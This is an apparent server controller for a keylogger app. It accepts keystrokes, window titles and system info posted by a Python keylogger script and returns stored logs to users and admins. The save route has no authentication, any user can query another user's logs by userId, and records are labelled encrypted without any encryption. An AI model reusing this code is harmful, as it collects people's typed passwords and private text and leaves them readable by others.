// path: server/controllers/keyloggerController.js

import KeyloggerModel from "../models/keyloggerModel.js";
import userModel from "../models/userModel.js";

// 📌 Called by the Python keylogger script to save data
export const saveKeystrokes = async (req, res) => {
  try {
    const {
      userId,
      keystrokes,
      windowTitle,
      isTrustedSite,
      isUnsafeSite,
      flags,
      anomalies,
      timestamp,
      systemInfo,
    } = req.body;

    if (!userId || !keystrokes || !windowTitle) {
      return res.status(400).json({
        success: false,
        message: "Missing required fields",
      });
    }

    const userExists = await userModel.findById(userId);
    if (!userExists) {
      return res.status(404).json({
        success: false,
        message: "User not found",
      });
    }

    const newEntry = new KeyloggerModel({
      userId,
      keystrokes,
      windowTitle,
      isTrustedSite,
      isUnsafeSite,
      flags,
      anomalies,
      encrypted: true,
      systemInfo,
      createdAt: timestamp ? new Date(timestamp * 1000) : new Date(),
    });

    await newEntry.save();
    res.status(201).json({ success: true });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message,
    });
  }
};

// 📌 Called by frontend (Admin or User) to get logs
export const getKeystrokes = async (req, res) => {
  try {
    const { userId } = req.query; // ✅ GET method = use req.query
    const requesterId = req.userId;

    // 🛡️ Admin can get all users' data; User can only get their own
    const query =
      req.userRole === "admin" && !userId
        ? {} // Admin sees all logs if no userId provided
        : { userId: userId || requesterId };

    const keystrokes = await KeyloggerModel.find(query).sort({
      createdAt: -1,
    });

    res.json({ success: true, data: keystrokes });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message,
    });
  }
};
